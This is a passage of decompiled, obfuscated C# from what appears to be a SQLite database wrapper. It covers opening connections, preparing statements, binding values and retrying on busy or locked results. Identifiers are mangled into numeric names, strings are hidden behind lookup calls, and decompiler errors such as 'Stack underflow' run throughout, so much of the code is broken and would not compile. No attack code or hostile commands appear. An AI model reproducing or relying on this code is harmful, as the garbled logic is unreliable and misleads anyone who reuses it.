			//IL_005a: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107403438);
				new ArgumentNullException((string?)/*Error near IL_005a: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			if (_0003 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403445));
			}
			global::_0011._0018._0001((global::_0011._0013)this, _0002, _0003, _0004);
			if (this._0001 == null)
			{
				this._0001 = new Dictionary<global::_0019._007F, global::_0012._0014>();
			}
			this._0001[_0002] = _0003;
		}

		internal override bool _0001(global::_0019._007F _0002, SQLiteConnectionFlags _0003)
		{
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107403438);
				new ArgumentNullException((string?)/*Error near IL_0054: Stack underflow*/);
				throw /*Error near IL_000e: Stack underflow*/;
			}
			if (this._0001 == null)
			{
				return false;
			}
			if (this._0001.TryGetValue(_0002, out var value) && global::_0011._0018._0001(_0002, (global::_0011._0013)this, _0003, value) && this._0001.Remove(_0002))
			{
				return true;
			}
			return false;
		}

		internal override bool _0001(string _0002)
		{
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
				{
					intPtr = global::_0011._0018._0001((string)/*Error near IL_0012: Stack underflow*/);
				}
				return global::_0011._0018._0001(global::_000E._001F._0001(this._0001), intPtr) switch
				{
					-1 => throw new SQLiteException(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107403400), new object[1] { _0002 })), 
					0 => false, 
					_ => true, 
				};
			}
			finally
			{
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
		}

		internal override _0080._0017 _0001(bool _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((byte)/*Error near IL_000d: Stack underflow*/ != 0);
			return (_0080._0017)/*Error near IL_0005: Stack underflow*/;
		}

		internal override _0080._0017 _0001()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			global::_0011._0018._0001((IntPtr)/*Error near IL_001d: Stack underflow*/);
			return (_0080._0017)/*Error near IL_000b: Stack underflow*/;
		}

		internal override _0080._0017 _0002()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(_0002: false);
			return (_0080._0017)/*Error near IL_0004: Stack underflow*/;
		}

		internal override bool _0003()
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = global::_001B._007E_008A_0003;
				global::_000E._001F obj = ((_0019)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_003a: Stack underflow*/(obj);
				if ((int)/*Error near IL_0019: Stack underflow*/ == 0)
				{
					return !global::_001B._007E_008B_0003(this._0001);
				}
			}
			return false;
		}

		internal override string _0001(string _0002)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				return null;
			}
			global::_000E._001F._0001(((_0019)/*Error near IL_0012: Stack underflow*/)._0001);
			return global::_0011._0018._0001(global::_0011._0018._0001(_0003: global::_0011._0018._0001(_0002), _0002: (IntPtr)/*Error near IL_001f: Stack underflow*/), -1);
		}

		internal override void _0001(string _0002, string _0003, SQLiteConnectionFlags _0004, global::_0004._0015 _0005, int _0006, bool _0007)
		{
			//IL_0260: Incompatible stack heights: 0 vs 1
			//IL_0266: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				((global::_0011._0013)/*Error near IL_0270: Stack underflow*/)._0002(_0002: true);
			}
			if (this._0001 != null)
			{
				throw new SQLiteException(_0080._0014._0001(107403358));
			}
			this._0001 = _0007;
			this._0003 = _0002;
			this._0001 = _0004;
			if (_0007)
			{
				this._0001 = global::_0011._0018._0001(_0006, _0002, out this._0001);
				global::_0017._0080._0001(null, new _001A(global::_000E._001D._0016, null, null, null, null, this._0001, _0002, new object[8]
				{
					_0091._0080_0004(typeof(_0019).TypeHandle),
					_0002,
					_0003,
					_0004,
					_0005,
					_0006,
					_0007,
					this._0001
				}));
			}
			if (this._0001 == null)
			{
				try
				{
				}
				finally
				{
					IntPtr zero = IntPtr.Zero;
					int num = (((_0004 & SQLiteConnectionFlags.NoExtensionFunctions) != SQLiteConnectionFlags.NoExtensionFunctions) ? 1 : 0);
					_0080._0017 obj = ((num == 0) ? global::_0011._0018._0001(global::_0011._0018._0001(_0002), ref zero, _0005, global::_0011._0018._0001(_0003)) : global::_0011._0018._0001(global::_0011._0018._0001(_0002), global::_0011._0018._0001(_0003), _0005, num, ref zero));
					if (obj != 0)
					{
						throw new SQLiteException(obj, null);
					}
					this._0001 = new global::_000E._001F(zero, _000F_0017_0006: true);
				}
				global::_000E._001F obj2;
				_0091_0002._009C_0005(obj2 = this._0001);
				try
				{
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
				global::_0017._0080._0001(null, new _001A(global::_000E._001D._0010, null, null, null, null, this._0001, _0002, new object[7]
				{
					_0091._0080_0004(typeof(_0019).TypeHandle),
					_0002,
					_0003,
					_0004,
					_0005,
					_0006,
					_0007
				}));
			}
			if ((_0004 & SQLiteConnectionFlags.NoBindFunctions) != SQLiteConnectionFlags.NoBindFunctions)
			{
				if (this._0001 == null)
				{
					this._0001 = new Dictionary<global::_0019._007F, global::_0012._0014>();
				}
				IEnumerator<KeyValuePair<global::_0019._007F, global::_0012._0014>> enumerator = global::_0011._0018._0001((global::_0011._0013)this, _0004).GetEnumerator();
				try
				{
					while (global::_001B._007E_0086_0003(enumerator))
					{
						KeyValuePair<global::_0019._007F, global::_0012._0014> current = enumerator.Current;
						this._0001[current.Key] = current.Value;
					}
				}
				finally
				{
					if (enumerator != null)
					{
						global::_0008._007E_0098(enumerator);
					}
				}
			}
			_0001(0);
			_0091_0002._009E_0005(this._0001);
		}

		internal override void _0002()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0003);
		}

		internal override int _0003()
		{
			Dictionary<string, int> dictionary = null;
			int num = 0;
			int num2 = 0;
			int result = 0;
			global::_0011._0018._0001(ref num, ref dictionary, ref num2, this._0003, ref result);
			return result;
		}

		internal override void _0001(int _0002)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			global::_000E._001F._0001(((_0019)/*Error near IL_0007: Stack underflow*/)._0001);
			IntPtr intPtr = (IntPtr)/*Error near IL_0051: Stack underflow*/;
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				throw new SQLiteException(_0080._0014._0001(107403367));
			}
			_0080._0017 obj = global::_0011._0018._0001(intPtr, _0002);
			if (obj != 0)
			{
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			}
		}

		internal override bool _0001(global::_0013._0017 _0002)
		{
			//IL_00fd: Incompatible stack heights: 0 vs 1
			Random random = null;
			_001B_0003._0098_0006();
			uint num = (uint)/*Error near IL_0103: Stack underflow*/;
			uint num2 = (uint)(_0002._0001._0002 * 1000);
			global::_0011._0018._0001(this);
			_0080._0017 obj;
			while (true)
			{
				try
				{
				}
				finally
				{
					obj = global::_0011._0018._0001(global::_0001._001F._0001(_0002._0001));
				}
				if (global::_0011._0018._0001(this))
				{
					break;
				}
				switch (obj)
				{
				case _0080._0017._0002:
					continue;
				case _0080._0017._0010:
					return false;
				case _0080._0017._0083:
					return true;
				case _0080._0017._0084:
					return false;
				}
				_0080._0017 obj2 = ((global::_0011._0013)this)._0001(_0002);
				switch (obj2)
				{
				case _0080._0017._0002:
					throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
				case _0080._0017._0007:
				case _0080._0017._0008:
					if (_0002._0001 != null)
					{
						if (random == null)
						{
							random = new Random();
						}
						if ((uint)(_001B_0003._0098_0006() - (int)num) > num2)
						{
							throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
						}
						global::_0007._0096(_009C_0003._007E_009C_0007(random, 1, 150));
					}
					break;
				}
			}
			if (obj == _0080._0017._0002 || obj == _0080._0017._0083 || obj == _0080._0017._0084)
			{
				obj = _0080._0017._0010;
			}
			throw new SQLiteException(obj, null);
		}

		internal override bool _0002(global::_0013._0017 _0002)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0019.m__0003.HasValue;
				if ((int)/*Error near IL_0009: Stack underflow*/ == 0)
				{
					_ = SQLiteVersionNumber;
					int num = (int)/*Error near IL_0058: Stack underflow*/;
					_0019.m__0003 = num >= 3007004;
				}
				if (_0019.m__0003.Value)
				{
					return global::_0011._0018._0001(global::_0001._001F._0001(_0002._0001)) != 0;
				}
			}
			catch (EntryPointNotFoundException)
			{
			}
			return false;
		}

		internal override _0080._0017 _0001(global::_0013._0017 _0002)
		{
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 1
			//IL_00ae: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001(((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001);
			global::_0011._0018._0001((IntPtr)/*Error near IL_00ae: Stack underflow*/);
			_0080._0017 obj = (_0080._0017)/*Error near IL_0015: Stack underflow*/;
			switch (obj)
			{
			case _0080._0017._0018:
			{
				string text = null;
				global::_0013._0017 obj2 = _0001(null, _0002._0001, null, (uint)(_0002._0001._0002 * 1000), ref text);
				try
				{
					global::_0008._007E_0007_0002(_0002._0001);
					if (obj2 != null)
					{
						_0002._0001 = obj2._0001;
						obj2._0001 = null;
					}
					global::_0011._0018._0001(_0002);
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
				return _0080._0017._0001;
			}
			case _0080._0017._0007:
			case _0080._0017._0008:
				return obj;
			default:
				throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
			case _0080._0017._0002:
				return obj;
			}
		}

		internal override string _0002()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((global::_0011._0013)/*Error near IL_000e: Stack underflow*/)._0002((string)null);
			return (string)/*Error near IL_0006: Stack underflow*/;
		}

		internal override string _0002(string _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			_ = ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;
			global::_000E._001F._0001(((_0019)/*Error near IL_000e: Stack underflow*/)._0001);
			string text = global::_0011._0018._0001((global::_000E._001F)/*Error near IL_0015: Stack underflow*/, (IntPtr)/*Error near IL_0015: Stack underflow*/);
			if (global::_001C._0096_0003(text))
			{
				text = _0002;
			}
			return text;
		}

		internal override global::_0013._0017 _0001(global::_0017._0080 _0002, string _0003, global::_0013._0017 _0004, uint _0005, ref string _0006)
		{
			//IL_04fb: Incompatible stack heights: 0 vs 2
			//IL_0505: Incompatible stack heights: 0 vs 1
			//IL_050b: Incompatible stack heights: 0 vs 2
			_ = global::_001C._0096_0003;
			/*Error near IL_0505: Stack underflow*/((string)/*Error near IL_0505: Stack underflow*/);
			if ((int)/*Error near IL_0011: Stack underflow*/ == 0)
			{
				_ = global::_0002._007E_000F;
				_0003 = /*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/);
			}
			if (!global::_001C._0096_0003(_0003))
			{
				string text = _0002?._0014;
				if (!global::_001C._0096_0003(text))
				{
					_0003 = global::_0003._007E_0080(_0003, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107403313), new object[1] { text }), string.Empty);
					_0003 = global::_0003._007E_0080(_0003, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107403272), new object[1] { text }), string.Empty);
				}
			}
			SQLiteConnectionFlags sQLiteConnectionFlags = _0002?.Flags ?? SQLiteConnectionFlags.Default;
			if (global::_0011._0018._0001() || (sQLiteConnectionFlags & SQLiteConnectionFlags.LogPrepare) == SQLiteConnectionFlags.LogPrepare)
			{
				if (_0003 == null || global::_001A._007E_0016_0003(_0003) == 0 || global::_001A._007E_0016_0003(global::_0002._007E_000F(_0003)) == 0)
				{
					global::_0011._0018._0001(_0080._0014._0001(107403295));
				}
				else
				{
					global::_0011._0018._0001(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107403774), new object[1] { _0003 }));
				}
			}
			IntPtr zero = IntPtr.Zero;
			IntPtr zero2 = IntPtr.Zero;
			int num = 0;
			_0080._0017 obj = _0080._0017._0018;
			int num2 = 0;
			int num3 = _0002?._0015 ?? 3;
			byte[] array = global::_0011._0018._0001(_0003);
			string text2 = null;
			global::_0013._0017 obj2 = null;
			Random random = null;
			uint num4 = (uint)_001B_0003._0098_0006();
			global::_0011._0018._0001(this);
			GCHandle gCHandle = _008E_0003._008A_0007(array, GCHandleType.Pinned);
			IntPtr intPtr = gCHandle.AddrOfPinnedObject();
			global::_0001._001F obj3 = null;
			try
			{
				while ((obj == _0080._0017._0018 || obj == _0080._0017._0008 || obj == _0080._0017._0007) && num2 < num3)
				{
					try
					{
					}
					finally
					{
						zero = IntPtr.Zero;
						zero2 = IntPtr.Zero;
						num = 0;
						obj = global::_0011._0018._0001(global::_000E._001F._0001(this._0001), intPtr, array.Length - 1, ref zero, ref zero2, ref num);
						if (obj == _0080._0017._0002 && _0090_0002._0099_0005(zero, IntPtr.Zero))
						{
							if (obj3 != null)
							{
								global::_0008._007E_0007_0002(obj3);
							}
							obj3 = new global::_0001._001F(this._0001, zero);
						}
					}
					if (obj3 != null)
					{
						global::_0017._0080._0001(null, new _001A(global::_000E._001D._0010, null, null, null, null, obj3, _0003, new object[5]
						{
							_0091._0080_0004(typeof(_0019).TypeHandle),
							_0002,
							_0003,
							_0004,
							_0005
						}));
					}
					if (global::_0011._0018._0001(this))
					{
						if (obj == _0080._0017._0002 || obj == _0080._0017._0083 || obj == _0080._0017._0084)
						{
							obj = _0080._0017._0010;
						}
						throw new SQLiteException(obj, null);
					}
					switch (obj)
					{
					case _0080._0017._0018:
						num2++;
						continue;
					case _0080._0017._0003:
						if (_009D_0003._009D_0007(((global::_0011._0013)this)._0002(), _0080._0014._0001(107403713), StringComparison.OrdinalIgnoreCase) == 0)
						{
							int num5 = _0086_0002._007E_008E_0005(_0003, ';');
							if (num5 == -1)
							{
								num5 = global::_001A._007E_0016_0003(_0003) - 1;
							}
							text2 = _0087_0002._007E_008F_0005(_0003, 0, num5 + 1);
							_0003 = _009E_0003._007E_009E_0007(_0003, num5 + 1);
							_0006 = string.Empty;
							while (obj2 == null && global::_001A._007E_0016_0003(_0003) > 0)
							{
								obj2 = _0001(_0002, _0003, _0004, _0005, ref _0006);
								_0003 = _0006;
							}
							if (obj2 != null)
							{
								global::_0011._0018._0001(obj2, text2);
							}
							return obj2;
						}
						if (this.m__0002 || _0096_0003._0095_0007(((global::_0011._0013)this)._0002(), 0, _0080._0014._0001(107403708), 0, 26, StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						_0006 = string.Empty;
						this.m__0002 = true;
						try
						{
							if (_009F_0003._007E_0004_0008(global::_0017._0082._0001, _0091._0080_0004(typeof(global::_000F._0011).TypeHandle)) is global::_000F._0011 obj4)
							{
								obj4._0001(_0002);
							}
							while (obj2 == null && global::_001A._007E_0016_0003(_0003) > 0)
							{
								obj2 = _0001(_0002, _0003, _0004, _0005, ref _0006);
								_0003 = _0006;
							}
							return obj2;
						}
						finally
						{
							this.m__0002 = false;
						}
					case _0080._0017._0007:
					case _0080._0017._0008:
						if (random == null)
						{
							random = new Random();
						}
						if ((uint)(_001B_0003._0098_0006() - (int)num4) > _0005)
						{
							throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
						}
						global::_0007._0096(_009C_0003._007E_009C_0007(random, 1, 150));
						continue;
					default:
						continue;
					case _0080._0017._0010:
						break;
					}
					break;
				}
				if (global::_0011._0018._0001(this))
				{
					if (obj == _0080._0017._0002 || obj == _0080._0017._0083 || obj == _0080._0017._0084)
					{
						obj = _0080._0017._0010;
					}
					throw new SQLiteException(obj, null);
				}
				switch (obj)
				{
				case _0080._0017._0010:
					return null;
				default:
					throw new SQLiteException(obj, ((global::_0011._0013)this)._0002());
				case _0080._0017._0002:
					_0006 = global::_0011._0018._0001(zero2, num);
					if (obj3 != null)
					{
						obj2 = new global::_0013._0017(this, sQLiteConnectionFlags, obj3, _0087_0002._007E_008F_0005(_0003, 0, global::_001A._007E_0016_0003(_0003) - global::_001A._007E_0016_0003(_0006)), _0004);
					}
					return obj2;
				}
			}
			finally
			{
				gCHandle.Free();
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, double _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, (ValueType)_0005);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005);
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, int _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, (ValueType)_0005);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005);
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, uint _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, (ValueType)_0005);
			}
			_0080._0017 obj2;
			if ((_0003 & SQLiteConnectionFlags.BindUInt32AsInt64) == SQLiteConnectionFlags.BindUInt32AsInt64)
			{
				long num = _0005;
				obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, num);
			}
			else
			{
				obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005);
			}
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, long _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, (ValueType)_0005);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005);
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, ulong _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, (ValueType)_0005);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005);
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, bool _0005)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Invalid comparison between Unknown and I8
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			global::_0001._001F obj2;
			if (2u != 0)
			{
				obj2 = obj;
			}
			if ((long)(/*Error near IL_0010: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj2, (ValueType)_0005);
			}
			int num = (_0005 ? 1 : 0);
			_0080._0017 obj3 = global::_0011._0018._0001(global::_0001._001F._0001(obj2), _0004, num);
			if (obj3 != 0)
			{
				throw new SQLiteException(obj3, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, string _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, _0005, obj);
			}
			byte[] array = global::_0011._0018._0001(_0005);
			if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
			{
				global::_0011._0018._0001(_0004, obj, array);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, array, array.Length - 1, _0099._008E_0004(-1));
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, DateTime _0005)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Invalid comparison between Unknown and I8
			//IL_01c6: Incompatible stack heights: 0 vs 1
			//IL_01d2: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_000a: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_0017: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0005, _0004, obj);
			}
			if ((_0003 & SQLiteConnectionFlags.BindDateTimeWithKind) == SQLiteConnectionFlags.BindDateTimeWithKind && ((global::_0001._001A)this)._0001 != 0 && _0005.Kind != 0 && _0005.Kind != ((global::_0001._001A)this)._0001)
			{
				if (((global::_0001._001A)this)._0001 == DateTimeKind.Utc)
				{
					_0005 = _0005.ToUniversalTime();
				}
				else if (((global::_0001._001A)this)._0001 == DateTimeKind.Local)
				{
					_0005 = _0005.ToLocalTime();
				}
			}
			switch (((global::_0001._001A)this)._0001)
			{
			case SQLiteDateFormats.Ticks:
			{
				long ticks = _0005.Ticks;
				if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
				{
					global::_0011._0018._0001(_0004, obj, (ValueType)ticks);
				}
				_0080._0017 obj5 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, ticks);
				if (obj5 != 0)
				{
					throw new SQLiteException(obj5, ((global::_0011._0013)this)._0002());
				}
				break;
			}
			case SQLiteDateFormats.JulianDay:
			{
				double num = global::_0011._0018._0001(_0005);
				if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
				{
					global::_0011._0018._0001(_0004, obj, (ValueType)num);
				}
				_0080._0017 obj3 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, num);
				if (obj3 != 0)
				{
					throw new SQLiteException(obj3, ((global::_0011._0013)this)._0002());
				}
				break;
			}
			case SQLiteDateFormats.UnixEpoch:
			{
				TimeSpan timeSpan = _0005.Subtract(global::_0001._001A._0001);
				long num2 = _0001_0004._0005_0008(timeSpan.TotalSeconds);
				if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
				{
					global::_0011._0018._0001(_0004, obj, (ValueType)num2);
				}
				_0080._0017 obj4 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, num2);
				if (obj4 != 0)
				{
					throw new SQLiteException(obj4, ((global::_0011._0013)this)._0002());
				}
				break;
			}
			default:
			{
				byte[] array = global::_0011._0018._0001((global::_0001._001A)this, _0005);
				if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
				{
					global::_0011._0018._0001(_0004, obj, array);
				}
				_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, array, array.Length - 1, _0099._008E_0004(-1));
				if (obj2 != 0)
				{
					throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
				}
				break;
			}
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004, byte[] _0005)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(_0004, obj, _0005);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, _0005, _0005.Length, _0099._008E_0004(-1));
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override void _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I8
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((long)(/*Error near IL_000e: Stack underflow*/ & 4) == 4)
			{
				global::_0011._0018._0001(obj, _0004);
			}
			_0080._0017 obj2 = global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004);
			if (obj2 != 0)
			{
				throw new SQLiteException(obj2, ((global::_0011._0013)this)._0002());
			}
		}

		internal override int _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = global::_0011._0018._0001(global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0010: Stack underflow*/));
			if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
			{
				IntPtr intPtr = global::_0001._001F._0001(obj);
				global::_0011._0018._0001(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107403671), new object[2] { intPtr, num }));
			}
			return num;
		}

		internal override string _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, int _0004)
		{
			//IL_0074: Incompatible stack heights: 0 vs 1
			global::_0001._001F obj = ((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = 0;
			string text = global::_0011._0018._0001(global::_0011._0018._0001(global::_0001._001F._0001(obj), _0004, ref num), num);
			if ((_0003 & SQLiteConnectionFlags.LogBind) == SQLiteConnectionFlags.LogBind)
			{
				IntPtr intPtr = global::_0001._001F._0001(obj);
				global::_0011._0018._0001(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107403590), new object[3] { intPtr, _0004, text }));
			}
			return text;
		}

		internal override int _0001(global::_0013._0017 _0002, SQLiteConnectionFlags _0003, string _0004)
		{
			//IL_006a: Incompatible stack heights: 0 vs 1
